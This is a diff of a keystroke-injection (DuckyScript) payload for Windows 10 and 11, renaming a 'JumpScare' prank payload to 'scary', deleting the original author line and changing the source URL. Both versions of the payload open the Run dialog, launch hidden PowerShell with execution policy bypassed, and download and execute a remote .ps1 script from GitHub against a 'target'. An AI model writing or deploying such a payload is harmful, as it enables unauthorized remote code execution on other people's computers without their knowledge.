@@ -1,8 +1,6 @@
-REM     Title: JumpScare
+REM     Title: scary
 
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to torment your target to the fullest extent. Mission to JumpScare. See JumpScare.ps1 for more details
+REM     Description: This payload is meant to creep out your target. See scary.ps1 for more details
 
 REM     Target: Windows 10, 11
 
@@ -19,5 +17,5 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/Heffrey13/Ducky-Pranks/blob/main/Creepy/assets/scary.ps1?dl=1; invoke-expression $pl
 ENTER
